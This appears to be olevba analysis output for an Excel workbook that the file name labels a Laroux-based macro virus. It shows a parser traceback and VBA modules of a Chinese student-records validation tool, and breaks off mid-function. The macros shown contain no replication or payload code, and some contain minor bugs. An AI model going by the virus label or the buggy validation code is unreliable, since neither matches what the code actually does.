olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6
Type: OLE
ERROR    Error when running oledump.plugin_biff, please report to https://github.com/decalage2/oletools/issues
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/oletools/thirdparty/oledump/plugin_biff.py", line 84, in P23Decode
    return value.decode('utf-8')
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x96 in position 2: invalid start byte

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 3435, in _extract_xlm_plugin_biff
    self.xlm_macros = biff_plugin.Analyze()
  File "/usr/local/lib/python3.8/dist-packages/oletools/thirdparty/oledump/plugin_biff.py", line 5346, in Analyze
    name = P23Decode(data[offset:offset+lnName])
  File "/usr/local/lib/python3.8/dist-packages/oletools/thirdparty/oledump/plugin_biff.py", line 86, in P23Decode
    return value.decode('windows-1252')
  File "/usr/lib/python3.8/encodings/cp1252.py", line 15, in decode
    return codecs.charmap_decode(input,errors,decoding_table)
UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 3: character maps to <undefined>
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub 开始检查_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 主程序.bas 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/主程序'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Check_Click()
'首先输入学校验证码，如果不输入直接退出
 xxbsm = InputBox("请输入学校标识码")
 If StrPtr(xxbsm) Then
    If IsNumeric(xxbssm) Then
        If Len(xxbsm) <> 10 Then
            xxbsm = InputBox("学校标识码必须为10位数字，请重新输入!")
        End If
    Else
       xxbsm = InputBox("学校标识码必须为10位数字，请重新输入!")
    End If
 Else
    Exit Sub
 End If
 
 checkName = Sheets(valueSheetName).Cells(2, 2)
 If checkName = "" Then
   MsgBox ("没有数据，无需校验！")
   Exit Sub
 End If
 '初始化列
 cc = getValueColumCount(valueSheetName)

 Dim columColection()  As TypeValueColum
 ReDim columColection(1 To cc)
    Dim cindex As Integer
    cindex = 1
    Title = Sheets(valueSheetName).Cells(1, cindex)
    While Title <> ""
        Dim vlaueColum As TypeValueColum
        
        vlaueColum.columnIndex = cindex
        vlaueColum.columnName = Sheets(valueSheetName).Cells(1, cindex)
         vlaueColum.dicColumnIndex = 0
         vlaueColum.dicColumnName = ""
        
        '去字典里找是否有同名列有则设置为字典
       dicColumnIndex = findDic(vlaueColum.columnName)
       If dicColumnIndex <> 0 Then
         vlaueColum.dicColumnIndex = dicColumnIndex
         vlaueColum.dicColumnName = Sheets(dicSheetName).Cells(1, dicColumnIndex)
       End If
       
       If vlaueColum.dicColumnIndex = 0 Then
        
       End If

       '手动对应字典
        Select Case Title
            Case "是否进城务工人员随迁子女"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员2民族"
                vlaueColum.dicColumnName = "民族"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员2身份证件类型"
                vlaueColum.dicColumnName = "家长证件类型"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员2是否监护人"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员2关系"
                vlaueColum.dicColumnName = "关系"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员1民族"
                vlaueColum.dicColumnName = "民族"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员1身份证件类型"
                vlaueColum.dicColumnName = "家长证件类型"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员1是否监护人"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "成员1关系"
                vlaueColum.dicColumnName = "关系"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否由政府购买学位"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否需要乘坐校车"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否烈士或优抚子女"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否孤儿"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否享受一补"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否需要申请资助"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否受过学前教育"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
            Case "是否独生子女"
                vlaueColum.dicColumnName = "是否"
                vlaueColum.dicColumnIndex = findDic(vlaueColum.dicColumnName)
        End Select
       '将列放入集合
       columColection(cindex) = vlaueColum
       cindex = cindex + 1
        
       Title = Sheets(valueSheetName).Cells(1, cindex)
    Wend
    
    curRowIndex = dataRowStart
    stuName = Sheets(valueSheetName).Cells(curRowIndex, 2)
    '初始化日志
   curMsgRow = 1
    a = clearLog()
   
    valueColumCoount = cc
    While stuName <> ""
        totalCount = totalCount + 1
        For col = 1 To valueColumCoount
           Dim valueCol As TypeValueColum
           valueCol = columColection(col)
           valueColName = valueCol.columnName
             '此次加校验
            Select Case valueColName
                 Case "学校标识码"
                    checkXXsbh valueCol, curRowIndex
                 
                Case "姓名"
                    checkXm valueCol, curRowIndex
                
                Case "性别"
                    checkXb valueCol, curRowIndex
                
                Case "出生日期"
                    checkCsrq valueCol, curRowIndex
                
                Case "出生地行政区划代码"
                    checkCsrXzqh valueCol, curRowIndex
                Case "籍贯"
                    checkJg valueCol, curRowIndex
                Case "民族"
                    checkMz valueCol, curRowIndex
                
                Case "国籍/地区"
                    checkGjdq valueCol, curRowIndex
                
                Case "身份证件类型"
                    checkSfzjlx valueCol, curRowIndex
                
                Case "港澳台侨外"
                    checkGat valueCol, curRowIndex
                
                Case "健康状况"
                     checkJkzk valueCol, curRowIndex
                
                Case "政治面貌"
                    checkZzmm valueCol, curRowIndex
                
                Case "身份证件号"
                    checkSfzjhm valueCol, curRowIndex
                
                Case "户口性质"
                    checkHkxz valueCol, curRowIndex
                
                Case "户口所在地行政区划"
                    checkHkszdXzqh valueCol, curRowIndex
                
                Case "班号"
                    checkBh valueCol, curRowIndex
                
                Case "入学年月"
                    checkRxny valueCol, curRowIndex
                
                Case "入学方式"
                    checkRxfs valueCol, curRowIndex
                
                Case "就读方式"
                    checkJdfs valueCol, curRowIndex
                
                Case "现住址"
                    checkXzz valueCol, curRowIndex
                
                Case "通信地址"
                    checkTxfs valueCol, curRowIndex
                
                Case "家庭地址"
                    checkJtzz valueCol, curRowIndex
                
                Case "联系电话"
                    checkLxdh valueCol, curRowIndex
                
                Case "邮政编码"
                    checkYzbm valueCol, curRowIndex
                
                Case "是否独生子女"
                    checkSfdszn valueCol, curRowIndex
                
                Case "是否受过学前教育"
                    checkSfsgxqjy valueCol, curRowIndex
                
                Case "是否留守儿童"
                    checkSflset valueCol, curRowIndex
                
                Case "是否需要申请资助"
                    checkSfsqzz valueCol, curRowIndex
                
                Case "是否享受一补"
                    checkSfxsyb valueCol, curRowIndex
                
                Case "是否孤儿"
                    checkSfge valueCol, curRowIndex
                
                Case "是否烈士或优抚子女"
                     checkSflshyfzn valueCol, curRowIndex
                    
                Case "上下学距离"
                    checkSxjl valueCol, curRowIndex
                
                Case "上下学方式"
                    checkSxxfs valueCol, curRowIndex
                
                Case "是否需要乘坐校车"
                    checkSfxyczxc valueCol, curRowIndex
                
                Case "曾用名"
                    checkCym valueCol, curRowIndex
                
                Case "身份证件有效期"
                    checkSfzyxq valueCol, curRowIndex
                    
                Case "血型"
                    checkXx valueCol, curRowIndex
                
                Case "特长"
                    checkTc valueCol, curRowIndex
                
                Case "学籍辅号"
                    checkXjfh valueCol, curRowIndex
                
                Case "班内学号"
                    checkBnxh valueCol, curRowIndex
                
                Case "学生来源"
                    checkXsly valueCol, curRowIndex
                    
                Case "电子信箱"
                    checkDzxx valueCol, curRowIndex
                
                Case "主页地址"
                    checkZydz valueCol, curRowIndex
                
                Case "残疾类型"
                    checkCjlx valueCol, curRowIndex
                
                Case "是否由政府购买学位"
                    checkSfyzfgmxw valueCol, curRowIndex
                
                Case "随班就读"
                    checkSbjd valueCol, curRowIndex
                    
                Case "隐藏"
                
                Case "成员1姓名"
                    checkCyyxm valueCol, curRowIndex
                
                Case "成员1关系"
                    checkCyygx valueCol, curRowIndex
                
                Case "成员1关系说明"
                    checkCyygxsm valueCol, curRowIndex
                
                Case "成员1现住址"
                    checkCyyxzz valueCol, curRowIndex
                
                Case "成员1户口所在地行政区划"
                    checkCyyhkszdxzqh valueCol, curRowIndex
                
                Case "成员1联系电话"
                    checkCyylxdh valueCol, curRowIndex
                    
                Case "成员1是否监护人"
                    checkCyysfjhr valueCol, curRowIndex
                
                Case "成员1身份证件类型"
                    checkCyysfzjlx valueCol, curRowIndex
                
                Case "成员1身份证件号"
                    checkCyysfzjh valueCol, curRowIndex
                
                Case "成员1民族"
                    checkCyymz valueCol, curRowIndex
                
                Case "成员1工作单位"
                    checkCyygzdw valueCol, curRowIndex
                
                Case "成员1职务"
                    checkCyyzw valueCol, curRowIndex
                
                Case "成员2姓名"
                    checkCyexm valueCol, curRowIndex
                
                Case "成员2关系"
                    checkCyegx valueCol, curRowIndex
                
                Case "成员2关系说明"
                    checkCyegxsm valueCol, curRowIndex
                
                Case "成员2现住址"
                    checkCyexzz valueCol, curRowIndex
                
                Case "成员2户口所在地行政区划"
                    checkCyehkszdxzqh valueCol, curRowIndex
                
                Case "成员2联系电话"
                     checkCyelxdh valueCol, curRowIndex
                
                Case "成员2是否监护人"
                    checkCyesfjhr valueCol, curRowIndex
                
                Case "成员2身份证件类型"
                    checkCyesfzjlx valueCol, curRowIndex
                
                Case "成员2身份证件号"
                    checkCyesfzjh valueCol, curRowIndex
                    
                Case "成员2民族"
                    checkCyemz valueCol, curRowIndex
                    
                Case "成员2工作单位"
                    checkCyegzdw valueCol, curRowIndex
                
                Case "成员2职务"
                    checkCyezw valueCol, curRowIndex
                    
                Case "是否进城务工人员随迁子女"
                    checkSfjcwgrysqzn valueCol, curRowIndex
                

             End Select
        Next col
        curRowIndex = curRowIndex + 1
        stuName = Sheets(valueSheetName).Cells(curRowIndex, 2)
    Wend
   
   '保存excel
   ActiveWorkbook.Save
   If curMsgRow > 1 Then
   MsgBox ("部分数据不符合要求，单击确定查看")
   
    '激活日志
    Sheets(msgSheetName).Visible = True
    Sheets(msgSheetName).Select
    Else
        MsgBox ("数据校验通过，可以上传")
        errorMsg = "数据校验成功,校验记录数为" & totalCount & "条！"
        writeLog (errorMsg)
        Sheets(msgSheetName).Visible = False
    End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 工具函数.bas 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/工具函数'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Function DicCheck(ValueColum, dicColum)
    '待检查数据列的表头
    Dim valueColumnTitle As String
    '待检查数据列的字典表头
    Dim dicColumnTitle As String
    '数据表格的行数
    Dim valueRowCount As Long
    '需要校验的sheet
    Dim curMsgRow As Integer
    
    Dim valueTitle As String
    
    valueTitle = Sheets(valueSheetName).Cells(1, ValueColum)
    
    valueRowCount = Sheets(valueSheetName).UsedRange.Rows.count
    For i = dataRowStart To valueRowCount
        cellValue = Sheets(valueSheetName).Cells(i, ValueColum)
        If cellValue = "" Then
            Exit Function
        End If
        If cellValue <> "" And DoDicCheck(cellValue, dicColum) = False Then
             errorMsg = "第" & i & "行的数据项：" & valueTitle & "不符合规范，请检查!"
             writeLog (errorMsg)
        End If
      
      Next i
End Function
'检查字典项是否合法
Function DoDicCheck(valueCol As TypeValueColum, rowIndex)
 '字典sheet
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    For j = dataRowStart To Sheets(dicSheetName).UsedRange.Rows.count - 1
        dicvalue = Sheets(dicSheetName).Cells(j, valueCol.dicColumnIndex)
        If dicvalue = "" Then
            Exit For
        End If
        If dicvalue = value Then
          DoDicCheck = True
             Exit Function
        End If
   Next j
   If valueCol.dicColumnName = "民族" Or valueCol.dicColumnName = "国籍/地区" Then
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不符合规范，请检查"
        writeLog (errorMsg)
   Else
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不符合规范，请检查" & getTextByDicName(valueCol.dicColumnName, valueCol.dicColumnIndex)
        writeLog (errorMsg)
   End If
   
   DoDicCheck = False
End Function
 '根据字典名称，获得字典的内容
 Function getTextByDicName(dicName, dicIndex)
    Dim str As String
    Dim count As Integer
    str = "(" & dicName & "："
    For j = dataRowStart To Sheets(dicSheetName).UsedRange.Rows.count - 1
        dicvalue = Sheets(dicSheetName).Cells(j, dicIndex)
        If dicvalue <> "" Then
            str = str + dicvalue + "、"
            count = count + 1
        Else
            lastIndex = InStrRev(str, "、")
            str = Application.WorksheetFunction.Substitute(str, "、", ")", count)
            str = Application.WorksheetFunction.Substitute(str, "、", "和", count - 1)
            getTextByDicName = str
            Exit Function
        End If
   Next j
 End Function
 '校验长度是否符合要求，参数
 'value:需要校验的内容
 'length:限定长度
 'strick:是否相等
 Function CheckValueLength(valueCol As TypeValueColum, rowIndex, length, strick)
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    valueLength = Len(value)
    
    If strick Then
        If valueLength = length Then
            CheckValueLength = True
            Exit Function
        Else
            CheckValueLength = False
            errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "必须为" & length & "位，请检查！"
            writeLog (errorMsg)
            Exit Function
        End If
    End If
    If valueLength <= length Then
        CheckValueLength = True
        Exit Function
    Else
        CheckValueLength = False
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "长度不能大于" & length & "位，请检查！"
        writeLog (errorMsg)
        Exit Function
    End If
 End Function
 '获得内容的字节数
 '返回字节长度
 Function checkByteLength(value)
    Dim byteLen As Integer
    byteLen = 0
    If IsEmpty(value) Then
        Exit Function
    End If
    valueLength = Len(value)
    For i = 1 To valueLength
        If Abs(Asc(Mid(value, i, 1))) > 255 Then
            byteLen = byteLen + 3
        Else
            byteLen = byteLen + 1
        End If
    Next i
    checkByteLength = byteLen
 End Function
 
'根据列查询是否有字典
'找到返回列索引
'找不到返回0
Function findDic(value)
    Dim index As Integer
    index = 1
    Title = Sheets(dicSheetName).Cells(1, index)
    While Title <> ""
        
        If Title = value Then
            findDic = index
            Exit Function
        End If
        index = index + 1
         Title = Sheets(dicSheetName).Cells(1, index)
    Wend
    findDic = 0
End Function

'是否为数字
'不是数字写入日志 返回 False
'是数字  返回 True
Function checkBeNumeric(valueCol As TypeValueColum, rowIndex)
    Dim beNumeric As Boolean
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    beNumeric = IsNumeric(value)
    If beNumeric Then
    Else
         errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "必须为数字，请检查！"
         writeLog (errorMsg)
         checkBeNumeric = False
         Exit Function
    End If
    checkBeNumeric = True
End Function
'检查是否为20110101日期格式
'合法，返回True
'不合法，返回False
Function CheckIsDate(valueCol As TypeValueColum, rowIndex)
    Dim beNumeric As Boolean
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If Len(value) <> 8 Then
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "格式不正确，请检查(例如：20120101)！"
        writeLog (errorMsg)
        CheckIsDate = False
        Exit Function
    End If
    
    beNumeric = IsNumeric(value)
    If beNumeric Then
    
    Else
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "格式不正确，请检查(例如：20120101)！"
        writeLog (errorMsg)
        CheckIsDate = False
        Exit Function
    End If
    
    dateStr = Left(value, 4) & "/" & Mid(value, 5, 2) & "/" & Right(value, 2)
    beDate = IsDate(dateStr)
    If beDate Then
    Else
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不合法，请检查(例如：20120101)！"
        writeLog (errorMsg)
        CheckIsDate = False
        Exit Function
    End If
    CheckIsDate = True
End Function
'检查是否为20110101日期格式
'合法，返回True
'不合法，返回False
Function CheckBeDate(value)
    Dim beNumeric As Boolean
    If Len(value) <> 8 Then
        CheckBeDate = False
        Exit Function
    End If
    
    beNumeric = IsNumeric(value)
    If beNumeric Then
    Else
        CheckBeDate = False
        Exit Function
    End If
    
    dateStr = Left(value, 4) & "/" & Mid(value, 5, 2) & "/" & Right(value, 2)
    beDate = IsDate(dateStr)
    If beDate Then
    Else
        CheckBeDate = False
        Exit Function
    End If
    CheckBeDate = True
End Function
'检查是否为201101日期格式
'合法，返回True
'不合法，返回False
Function CheckIsYmDate(valueCol As TypeValueColum, rowIndex)
    Dim beNumeric As Boolean
    value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
    If Len(value) <> 6 Then
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "格式不正确，请检查(例如：201201)！"
        writeLog (errorMsg)
        CheckIsYmDate = False
        Exit Function
    End If
    
    beNumeric = IsNumeric(value)
    If beNumeric Then
    
    Else
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "格式不正确，请检查(例如：201201)！"
        writeLog (errorMsg)
        CheckIsYmDate = False
        Exit Function
    End If
    
    dateStr = Left(value, 4) & "/" & Right(value, 2) & "/01"
    beDate = IsDate(dateStr)
    If beDate Then
    Else
        errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "不合法，请检查(例如：20120101)！"
        writeLog (errorMsg)
        CheckIsYmDate = False
        Exit Function
    End If
    CheckIsYmDate = True
End Function
'比较两个日期大小
'date1>date2 返回1
'date1=date2 返回0
'date1<date2 返回-1
'其他返回2
Function compareDate(dateStr1, dateStr2)
    Dim date1 As Date
    Dim date2 As Date
    If Len(dateStr1) <> 8 Or Len(dateStr2) <> 8 Then
        compareDate = 2
        Exit Function
    End If
    
     
    If IsNumeric(dateStr1) And IsNumeric(dateStr2) Then
    Else
        compareDate = 2
        Exit Function
    End If
    
    date1 = Left(dateStr1, 4) & "/" & Mid(dateStr1, 5, 2) & "/" & Right(dateStr1, 2)
    date2 = Left(dateStr2, 4) & "/" & Mid(dateStr2, 5, 2) & "/" & Right(dateStr2, 2)
    If date1 - date2 > 0 Then
        compareDate = 1
    ElseIf date1 - date2 = 0 Then
        compareDate = 0
    Else
        compareDate = -1
    End If
End Function
'检查必填项
'空时返回0
'不为空时返回1
Function checkRequired(rowIndex, columnIndex)
    '表头内容
    Dim valueTitle As String
    '单元格内容
    Dim cellValue As String
    
    valueTitle = Sheets(valueSheetName).Cells(1, columnIndex)
    
    cellValue = Sheets(valueSheetName).Cells(rowIndex, columnIndex)
    If cellValue = "" Then
         checkRequired = 0
         errorMsg = "第" & rowIndex & "行的数据项：" & valueTitle & "不能为空，请填写！"
         writeLog (errorMsg)
    Else
        checkRequired = 1
    End If
End Function
'检查身份证件号码是否合法
'不合法，返回0
'合法，返回1
'15位 升级18位
Function IDcheck(ID)
    Dim s, i As Integer
    Dim e, z As String
    '----------------------------身份证号码合法性检查---------------------------------------
    If Not (Len(ID) = 18 Or Len(ID) = 15) Then                                            '位数检验
       IDcheck = 0
       Exit Function
       Else
       If Len(ID) = 15 Then ID = Left(ID, 6) & "19" & Right(ID, 9)
       If IsNumeric(Left(ID, 17)) = False Or InStr(ID, ".") > 0 Then                      '字符检验
          IDcheck = 0
          Exit Function
       End If
       On Error Resume Next                                                               '日期检验
       If DateValue(Mid(ID, 7, 4) & "-" & Mid(ID, 11, 2) & "-" & Mid(ID, 13, 2)) < 1 Or _
          DateValue(Mid(ID, 7, 4) & "-" & Mid(ID, 11, 2) & "-" & Mid(ID, 13, 2)) > Date Then
          IDcheck = 0
          Exit Function
       End If
    End If
     '-----------------------------校验码的生成及检查----------------------------------------
    s = 0
    For i = 1 To 17
       s = s + Val(Mid(ID, 18 - i, 1)) * (2 ^ i Mod 11)
    Next
    e = Mid("10X98765432", (s Mod 11) + 1, 1)                                           '生成校验码
    If Len(ID) = 18 Then
       z = UCase(Right(ID, 1))
       If z = e Then                                                                    '校验码对比
          IDcheck = 1
          Else
          IDcheck = 0                  '如果要返回校验码，请把本行语句改为：IDcheck = e
       End If
       Else
       IDcheck = ID & e                                                         '15位身份证号码升位
    End If

End Function
'校验电子邮箱
Function matchEmail(value)
    Dim beIndex As Integer
    beIndex = InStr(value, "@")
    If beIndex = 0 Then
        matchEmail = False
    End If
    matchEmail = True
End Function
Function getValueColumCount(sheetName)
    index = 1
    Title = Sheets(sheetName).Cells(1, index)
    While Title <> ""
        index = index + 1
        Title = Sheets(sheetName).Cells(1, index)
    Wend
    getValueColumCount = index - 1
End Function
'删除日志
Function clearLog()
    Sheets(msgSheetName).Columns(1).Delete

End Function
'写日志
Function writeLog(content As String)
    Sheets(msgSheetName).Cells(curMsgRow, 1) = content
    curMsgRow = curMsgRow + 1
End Function


-------------------------------------------------------------------------------
VBA MACRO 开始使用.bas 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/开始使用'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Begin_Click()

Sheets(valueSheetName).Visible = True
Sheets(valueSheetName).Select
Sheets(readmeSheetName).Visible = False

End Sub
-------------------------------------------------------------------------------
VBA MACRO 声明.bas 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/声明'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Public Type TypeValueColum
    '列索引号
    columnIndex As Integer
    '列名称
    columnName As String
    '对应字典列索引。没有字典对应时为0
    dicColumnIndex As Integer
    '对应字典列索引。没有字典对应时为空
    dicColumnName As String
 End Type
 
  '学校标识码
 Public xxbsm As String
     '定义一个结构，描述数据页
 
Public Const valueSheetName As String = "学生基础信息"
Public Const dicSheetName As String = "字典"
Public Const msgSheetName As String = "错误信息"
Public Const readmeSheetName As String = "说明"
Public totalCount As Integer    '记录总的校验数

 
Public Const dataRowStart As Integer = 2
Public curMsgRow As Integer

-------------------------------------------------------------------------------
VBA MACRO 校验函数.bas 
in file: Virus.MSExcel.Laroux-based-1f39609b1c9bc5335c7c184d76c01d28a4347b034292a8345cd11274736351d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/校验函数'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'1 学校标识码
Function checkXXsbh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 10, True)
        If isBeing Then
            value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
            If xxbsm <> value Then
                errorMsg = "第" & rowIndex & "行的数据项：" & valueCol.columnName & "和输入的学校标识码不相同，请检查!"
                writeLog (errorMsg)
            End If
        End If
    End If
End Function
'2 姓名
Function checkXm(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        oldValue = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
        newValue = Replace(oldValue, " ", "")
        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex).value = newValue
        isBeing = CheckValueLength(valueCol, rowIndex, 30, False)
    End If

End Function
'3 性别
Function checkXb(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("性别没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
'4 出生日期
Function checkCsrq(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        beDate = CheckIsDate(valueCol, rowIndex)
    End If
End Function
'5 出生地行政区划
Function checkCsrXzqh(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 12, True)
        If isBeing Then
           IsNumber = checkBeNumeric(valueCol, rowIndex)
        End If
    End If
End Function
'6 籍贯
Function checkJg(valueCol As TypeValueColum, rowIndex)
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
        isBeing = CheckValueLength(valueCol, rowIndex, 20, False)
    End If
End Function
'7  民族
Function checkMz(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("民族没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
'8  国籍/地区
Function checkGjdq(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("国籍/地区没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
'9  身份证件类型
Function checkSfzjlx(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("身份证件类型没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
           If isBeing Then
             value = Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex)
             beID = IDcheck(Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex + 4))
             Select Case value
                Case "其他"
                    Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex + 4).value = ""
                Case "居民身份证"
                    If beID = 0 Then
                        errorMsg = "第" & rowIndex & "行的数据项：身份证件号不正确，请检查！"
                        writeLog (errorMsg)
                    ElseIf beID = 1 Then
                    Else
                        Sheets(valueSheetName).Cells(rowIndex, valueCol.columnIndex + 4).value = beID
                    End If
                Case Else
                    If beID = "" Then
                        errorMsg = "第" & rowIndex & "行的数据项：身份证件号不能为空，请检查！"
                        writeLog (errorMsg)
                    End If
             End Select
           End If
    End If
    
End Function
'10 港澳台侨外
Function checkGat(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("港澳台侨外没有对应字典列检查，请联系管理员！")
        Exit Function
    End If

    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
'11 健康状况
Function checkJkzk(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("健康状况没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
'12 政治面貌
Function checkZzmm(valueCol As TypeValueColum, rowIndex)
    If valueCol.dicColumnIndex = 0 Then
        MsgBox ("政治面貌没有对应字典列检查，请联系管理员！")
        Exit Function
    End If
    
    If checkRequired(rowIndex, valueCol.columnIndex) = 1 Then
           isBeing = DoDicCheck(valueCol, rowIndex)
    End If
End Function
'13 身份证件号
Function checkSfzjhm(valueCol As TypeValueColum, rowIndex)
